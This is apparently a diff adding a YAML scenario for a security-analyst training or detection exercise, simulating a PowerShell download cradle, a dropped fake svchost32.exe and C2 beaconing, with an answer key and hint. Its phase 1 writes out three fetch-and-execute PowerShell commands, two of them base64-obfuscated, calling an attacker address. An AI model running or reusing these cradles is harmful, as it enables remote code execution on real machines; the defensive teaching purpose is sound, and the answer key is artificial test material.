@@ -1,0 +1,76 @@
+meta:
+  name: "PowerShell Download Cradle + C2 Beaconing"
+  difficulty: medium
+  answer: INCIDENT
+  mitre_techniques:
+    - id: T1059.001
+      name: "Command and Scripting Interpreter: PowerShell"
+    - id: T1105
+      name: "Ingress Tool Transfer"
+    - id: T1071.001
+      name: "Application Layer Protocol: Web Protocols"
+  hint: "IEX (Invoke-Expression) combined with DownloadString is the canonical PowerShell download cradle — it downloads and immediately executes remote code entirely in memory without writing to disk. This is a strong malicious indicator. The follow-on beaconing (regular HTTP POSTs to the same external IP at fixed intervals) confirms C2 communication. Legitimate PowerShell scripts do not IEX content from external IP addresses, especially non-RFC1918 ones."
+  alert:
+    rule_id: SUSPICIOUS_PROCESS
+    severity: HIGH
+    summary: "PowerShell download cradle (IEX DownloadString) detected on {inject_malicious_host} by {inject_malicious_user}"
+    description: "Behavioural rule fired: powershell.exe executed with IEX and DownloadString targeting an external IP. In-memory execution leaves no file on disk, indicating fileless malware. Subsequent network connections to the same destination suggest active C2 channel."
+
+world_overrides:
+  attacker_ip: "203.0.113.99"
+  inject_malicious_host: "WS009"
+  inject_malicious_user: "brian.walsh"
+
+phases:
+  phase_1:
+    name: "Execution: PowerShell Download Cradle"
+    technique: T1059.001
+    count: 2
+    log_factory: sysmon.process_create
+    spread_seconds: 20
+    delay_after_prev: [3, 10]
+    params:
+      dest_host: "{inject_malicious_host}"
+      source_ip: "{attacker_ip}"
+      target_user: "{inject_malicious_user}"
+      command_line:
+        - "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.99/stage1')\""
+        - "powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4AOQA5AC8AcwB0AGEAZwBlADIAJwApAA=="
+        - "powershell.exe -NoProfile -ExecutionPolicy Bypass -c \"iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWV4IChodHRwOi8vMjAzLjAuMTEzLjk5L3BheWxvYWQucHMxKQ==')))\""
+
+  phase_2:
+    name: "Execution: Dropped Executable"
+    technique: T1105
+    count: 1
+    log_factory: sysmon.file_create
+    spread_seconds: 5
+    delay_after_prev: [5, 15]
+    params:
+      dest_host: "{inject_malicious_host}"
+      target_user: "{inject_malicious_user}"
+      target_filename: "C:\\Users\\brian.walsh\\AppData\\Roaming\\svchost32.exe"
+
+  phase_3:
+    name: "C2: Outbound Network Connections"
+    technique: T1071.001
+    count: 3
+    log_factory: sysmon.network_connect
+    spread_seconds: 90
+    delay_after_prev: [10, 30]
+    params:
+      dest_host: "{inject_malicious_host}"
+      source_ip: "{attacker_ip}"
+      target_user: "{inject_malicious_user}"
+
+  phase_4:
+    name: "C2: HTTP Beacon Traffic"
+    technique: T1071.001
+    count: 3
+    log_factory: proxy.http_request
+    spread_seconds: 180
+    delay_after_prev: [30, 90]
+    params:
+      source_ip: "{attacker_ip}"
+      url: "http://203.0.113.99/api/v1/check"
+      method: POST
+      user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
